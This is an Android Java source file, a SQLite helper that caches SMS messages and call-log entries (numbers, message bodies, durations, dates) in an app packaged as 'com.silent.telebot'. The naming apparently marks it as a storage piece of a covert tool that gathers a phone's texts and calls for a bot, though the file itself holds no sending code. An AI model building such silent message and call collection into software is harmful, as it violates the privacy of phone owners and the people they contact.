package com.silent.telebot;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class DatabaseHelper extends SQLiteOpenHelper {
    private static final String DB_NAME = "TeleBotCache.db";
    private static final int DB_VERSION = 1;

    // جداول SMS
    private static final String TABLE_SMS = "sms";
    private static final String COL_SMS_ID = "_id";
    private static final String COL_SMS_ADDRESS = "address";
    private static final String COL_SMS_BODY = "body";
    private static final String COL_SMS_DATE = "date";

    // جداول Calls
    private static final String TABLE_CALLS = "calls";
    private static final String COL_CALL_ID = "_id";
    private static final String COL_CALL_NUMBER = "number";
    private static final String COL_CALL_DURATION = "duration";
    private static final String COL_CALL_TYPE = "type";
    private static final String COL_CALL_DATE = "date";

    public DatabaseHelper(Context context) {
        super(context, DB_NAME, null, DB_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        // جدول الرسائل
        String createSmsTable = "CREATE TABLE " + TABLE_SMS + " (" +
                COL_SMS_ID + " INTEGER PRIMARY KEY, " +
                COL_SMS_ADDRESS + " TEXT, " +
                COL_SMS_BODY + " TEXT, " +
                COL_SMS_DATE + " LONG)";
        db.execSQL(createSmsTable);

        // جدول المكالمات
        String createCallsTable = "CREATE TABLE " + TABLE_CALLS + " (" +
                COL_CALL_ID + " INTEGER PRIMARY KEY, " +
                COL_CALL_NUMBER + " TEXT, " +
                COL_CALL_DURATION + " LONG, " +
                COL_CALL_TYPE + " INTEGER, " +
                COL_CALL_DATE + " LONG)";
        db.execSQL(createCallsTable);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_SMS);
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_CALLS);
        onCreate(db);
    }

    // =================== SMS ===================
    public void insertSms(long id, String address, String body, long date) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(COL_SMS_ID, id);
        values.put(COL_SMS_ADDRESS, address);
        values.put(COL_SMS_BODY, body);
        values.put(COL_SMS_DATE, date);
        db.insertWithOnConflict(TABLE_SMS, null, values, SQLiteDatabase.CONFLICT_IGNORE);
        db.close();
    }

    public List<Map<String, String>> getLastSms(int limit) {
        List<Map<String, String>> list = new ArrayList<>();
        SQLiteDatabase db = getReadableDatabase();
        Cursor cursor = db.query(TABLE_SMS, null, null, null, null, null, COL_SMS_DATE + " DESC", String.valueOf(limit));
        while (cursor.moveToNext()) {
            Map<String, String> map = new HashMap<>();
            map.put("address", cursor.getString(cursor.getColumnIndexOrThrow(COL_SMS_ADDRESS)));
            map.put("body", cursor.getString(cursor.getColumnIndexOrThrow(COL_SMS_BODY)));
            map.put("date", String.valueOf(cursor.getLong(cursor.getColumnIndexOrThrow(COL_SMS_DATE))));
            list.add(map);
        }
        cursor.close();
        db.close();
        return list;
    }

    // =================== CALLS ===================
    public void insertCall(long id, String number, long duration, int type, long date) {
        SQLiteDatabase db = getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(COL_CALL_ID, id);
        values.put(COL_CALL_NUMBER, number);
        values.put(COL_CALL_DURATION, duration);
        values.put(COL_CALL_TYPE, type);
        values.put(COL_CALL_DATE, date);
        db.insertWithOnConflict(TABLE_CALLS, null, values, SQLiteDatabase.CONFLICT_IGNORE);
        db.close();
    }

    public List<Map<String, String>> getLastCalls(int limit) {
        List<Map<String, String>> list = new ArrayList<>();
        SQLiteDatabase db = getReadableDatabase();
        Cursor cursor = db.query(TABLE_CALLS, null, null, null, null, null, COL_CALL_DATE + " DESC", String.valueOf(limit));
        while (cursor.moveToNext()) {
            Map<String, String> map = new HashMap<>();
            map.put("number", cursor.getString(cursor.getColumnIndexOrThrow(COL_CALL_NUMBER)));
            map.put("duration", String.valueOf(cursor.getLong(cursor.getColumnIndexOrThrow(COL_CALL_DURATION))));
            map.put("type", String.valueOf(cursor.getInt(cursor.getColumnIndexOrThrow(COL_CALL_TYPE))));
            map.put("date", String.valueOf(cursor.getLong(cursor.getColumnIndexOrThrow(COL_CALL_DATE))));
            list.add(map);
        }
        cursor.close();
        db.close();
        return list;
    }

    // حذف البيانات القديمة (للحفاظ على المساحة) - اختياري
    public void clearOldData(long olderThanDays) {
        long cutoff = System.currentTimeMillis() - (olderThanDays * 24 * 60 * 60 * 1000L);
        SQLiteDatabase db = getWritableDatabase();
        db.delete(TABLE_SMS, COL_SMS_DATE + " < ?", new String[]{String.valueOf(cutoff)});
        db.delete(TABLE_CALLS, COL_CALL_DATE + " < ?", new String[]{String.valueOf(cutoff)});
        db.close();
    }
}
